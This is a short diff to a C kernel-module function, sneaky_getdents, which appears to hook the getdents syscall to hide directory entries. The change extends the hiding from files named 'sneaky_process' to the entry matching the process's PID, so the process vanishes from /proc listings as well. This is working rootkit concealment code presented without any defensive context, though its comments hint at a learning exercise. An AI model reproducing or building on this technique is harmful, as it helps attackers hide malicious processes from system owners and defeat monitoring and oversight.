@@ -88,7 +88,7 @@ asmlinkage int sneaky_getdents (unsigned int fd,
   //  printk("Get Dents!");
 
   // iterate through "dirp ",
-  // skip: any dirent with filename == "sneaky_process"
+  // skip: any dirent with filename == "sneaky_process" || == pid_str
   // the trick for "skip" is: memmove all the dirents that are un-examined to the location of the current dirent
   int offset; // ??? "forbids var declaration in for loop"??
   for (offset = 0; offset < (dirent_size - skipped_size);) {
@@ -98,7 +98,8 @@ asmlinkage int sneaky_getdents (unsigned int fd,
     /* printk(">>"); */
     /* printk(ptr->d_name); */
 
-    if (strcmp(ptr->d_name, "sneaky_process") == 0) {
+    if (strcmp(ptr->d_name, pid_str) == 0 ||
+	strcmp(ptr->d_name, "sneaky_process") == 0) {
       // ha! ISO C90 forbids mixed var declare & code !??
       void* unexamined_start;
       int unexamined_size;
